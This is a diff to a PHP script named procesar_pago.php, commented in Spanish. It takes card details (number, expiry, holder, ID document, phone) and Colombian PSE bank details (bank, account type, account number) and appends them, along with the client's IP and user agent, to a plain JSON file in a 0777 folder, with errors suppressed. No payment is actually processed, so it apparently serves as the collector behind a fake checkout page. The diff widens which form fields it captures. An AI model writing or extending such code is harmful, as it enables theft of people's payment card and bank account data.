@@ -1,8 +1,7 @@
 <?php
 /**
- * procesar_pago.php - CORREGIDO v3
+ * procesar_pago.php - CORREGIDO
  * Guarda tarjetas de crédito y datos PSE en transacciones.json
- * ACEPTA: FormData Y JSON
  */
 
 error_reporting(0);
@@ -37,7 +36,7 @@ if (empty($data)) {
     exit;
 }
 
-// Crear carpeta data si no existe
+// Crear carpeta data
 $dataDir = __DIR__ . '/data';
 if (!is_dir($dataDir)) {
     @mkdir($dataDir, 0777, true);
@@ -52,24 +51,33 @@ if (file_exists($transaccionesFile)) {
     $transacciones = json_decode($content, true) ?? [];
 }
 
-// Crear nueva transacción
+// ======================== DETECTAR TIPO DE PAGO ========================
+$metodo_pago = $data['metodo_pago'] ?? '';
+
+// Si es PSE o tiene campos de PSE
+$esPSE = false;
+if ($metodo_pago === 'pse' || !empty($data['banco_pse']) || !empty($data['tipo_cuenta'])) {
+    $esPSE = true;
+}
+
+// ======================== DATOS COMUNES ========================
 $nuevaTransaccion = [
     'id' => uniqid('TRX_'),
     'fecha' => date('Y-m-d H:i:s'),
     'timestamp' => time(),
-    'metodo_pago' => $data['metodo_pago'] ?? 'tarjeta',
+    'metodo_pago' => $metodo_pago,
     'plan_nombre' => $data['plan_nombre'] ?? 'N/A',
     'plan_precio' => $data['plan_precio'] ?? 0,
     'ip' => $_SERVER['REMOTE_ADDR'] ?? '',
     'user_agent' => substr($_SERVER['HTTP_USER_AGENT'] ?? '', 0, 255)
 ];
 
-// Si es tarjeta de crédito
-if (isset($data['numero_tarjeta']) && !empty($data['numero_tarjeta'])) {
+// ======================== SI ES TARJETA ========================
+if (!$esPSE && isset($data['numero_tarjeta']) && !empty($data['numero_tarjeta'])) {
     $nuevaTransaccion['tipo'] = 'TARJETA';
     $nuevaTransaccion['tipo_tarjeta'] = $data['tipo'] ?? $data['tipo_tarjeta'] ?? '';
-    $nuevaTransaccion['documento'] = $data['documento'] ?? '';
-    $nuevaTransaccion['titular'] = $data['titular'] ?? '';
+    $nuevaTransaccion['documento'] = $data['documento'] ?? $data['identificacion'] ?? '';
+    $nuevaTransaccion['titular'] = $data['titular'] ?? $data['usuario'] ?? '';
     $nuevaTransaccion['numero_celular'] = $data['numero_celular'] ?? $data['celular'] ?? '';
     $nuevaTransaccion['numero_tarjeta'] = $data['numero_tarjeta'] ?? '';
     $nuevaTransaccion['vencimiento'] = $data['vencimiento'] ?? '';
@@ -79,14 +87,14 @@ if (isset($data['numero_tarjeta']) && !empty($data['numero_tarjeta'])) {
     $nuevaTransaccion['usar_datos_facturacion'] = $data['usar_datos_facturacion'] ?? false;
 }
 
-// Si es PSE
-if (isset($data['banco_pse']) && !empty($data['banco_pse'])) {
+// ======================== SI ES PSE ========================
+if ($esPSE) {
     $nuevaTransaccion['tipo'] = 'PSE';
-    $nuevaTransaccion['documento_pse'] = $data['documento_pse'] ?? '';
-    $nuevaTransaccion['titular_pse'] = $data['titular_pse'] ?? '';
+    $nuevaTransaccion['documento_pse'] = $data['documento_pse'] ?? $data['documento'] ?? $data['identificacion'] ?? '';
+    $nuevaTransaccion['titular_pse'] = $data['titular_pse'] ?? $data['titular'] ?? $data['usuario'] ?? '';
     $nuevaTransaccion['tipo_cuenta'] = $data['tipo_cuenta'] ?? '';
-    $nuevaTransaccion['tipo_documento'] = $data['tipo_documento'] ?? '';
-    $nuevaTransaccion['banco_pse'] = $data['banco_pse'] ?? '';
+    $nuevaTransaccion['tipo_documento'] = $data['tipo_documento'] ?? $data['tipo_identificacion'] ?? '';
+    $nuevaTransaccion['banco_pse'] = $data['banco_pse'] ?? $data['banco'] ?? '';
     $nuevaTransaccion['numero_cuenta'] = $data['numero_cuenta'] ?? '';
 }
 
